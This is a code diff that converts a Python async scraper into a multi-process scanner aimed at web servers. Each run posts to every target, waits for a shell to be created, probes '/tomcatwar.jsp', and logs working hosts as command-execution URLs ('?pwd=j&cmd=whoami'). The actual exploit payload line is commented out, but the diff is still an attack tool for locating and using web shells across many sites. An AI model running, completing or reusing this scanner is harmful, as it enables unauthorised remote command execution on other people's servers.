@@ -1,40 +1,50 @@
 import asyncio
 import aiohttp
 import aiofiles
-import aioredis
 import concurrent.futures
 from math import ceil
 from config import *
+from urllib.parse import urlsplit
 
 
-async def get_and_scrape_pages(links):
-    redis = aioredis.from_url(REDIS_SERVER_URL, decode_responses=True, db=REDIS_SERVER_DB)
+async def check(links):
     async with aiohttp.ClientSession() as client:
         for link in links:
             try:
-                async with client.get(link) as response:
-                    '''if response.status != 200:
-                        await errors_log.write(f"{link}\n")'''
+                # async with client.post(url=link, data=post_data, headers=post_headers, ssl=False, allow_redirects=False) as response:
+                async with client.post(url=link, data={"script-kiddie": "must-die"}, ssl=False, allow_redirects=False) as response:
+                    await response.text()
 
-                    content = await response.text()
-                    await redis.set(link, content)
+                await asyncio.sleep(10)  # timeout, wait for creation shell..
+
+                _ = urlsplit(link)
+                root_url = _.scheme + "://" + _.netloc + "/tomcatwar.jsp"
+
+                async with client.get(url=root_url, ssl=False, allow_redirects=False) as response:
+                    if response.status == 200:
+                        async with aiofiles.open(SUCCESS_LOG, "a+", encoding="utf-8") as success_log:
+                            await success_log.write(f"{root_url}?pwd=j&cmd=whoami\n")
+                    else:
+                        continue
+
             except Exception as e:
                 async with aiofiles.open(ERROR_LOG, "a+", encoding="utf-8") as errors_log:
                     await errors_log.write(f"{link} {e}\n")
+                continue
 
 
-async def start_scrapping(links):
+async def start_check(links):
     parted_domains = split_array(links, NUM_COROS)
     tasks = []
 
     for part in parted_domains:
-        tasks.append(get_and_scrape_pages(part))
+        tasks.append(check(part))
 
     await asyncio.gather(*tasks)
 
 
-def prepare_scrapping(links):
-    asyncio.run(start_scrapping(links))
+def prepare_check(links):
+    asyncio.run(start_check(links))
 
 
 def split_array(array, parts):
@@ -53,7 +63,7 @@ def main():
 
     with concurrent.futures.ProcessPoolExecutor(NUM_CPU_CORES) as executor:
         for i in range(NUM_CPU_CORES):
-            new_future = executor.submit(prepare_scrapping, links=parted_links.pop())
+            new_future = executor.submit(prepare_check, links=parted_links.pop())
             futures.append(new_future)
 
     concurrent.futures.wait(futures)
